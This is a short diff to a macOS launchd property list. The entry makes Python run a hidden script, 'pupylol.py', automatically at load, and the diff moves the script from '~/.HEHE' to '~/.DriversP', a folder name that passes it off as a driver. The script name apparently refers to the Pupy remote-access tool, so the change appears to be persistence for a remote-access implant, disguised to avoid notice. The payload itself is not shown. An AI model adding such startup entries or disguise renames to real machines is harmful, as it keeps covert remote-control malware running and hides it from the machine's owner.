@@ -7,7 +7,7 @@
 	<key>ProgramArguments</key>
 	<array>
         <string>/usr/bin/python</string>
-	  <string>~/.HEHE/pupylol.py</string>
+	  <string>~/.DriversP/pupylol.py</string>
 	</array>
 	<key>RunAtLoad</key>
 	<true/>
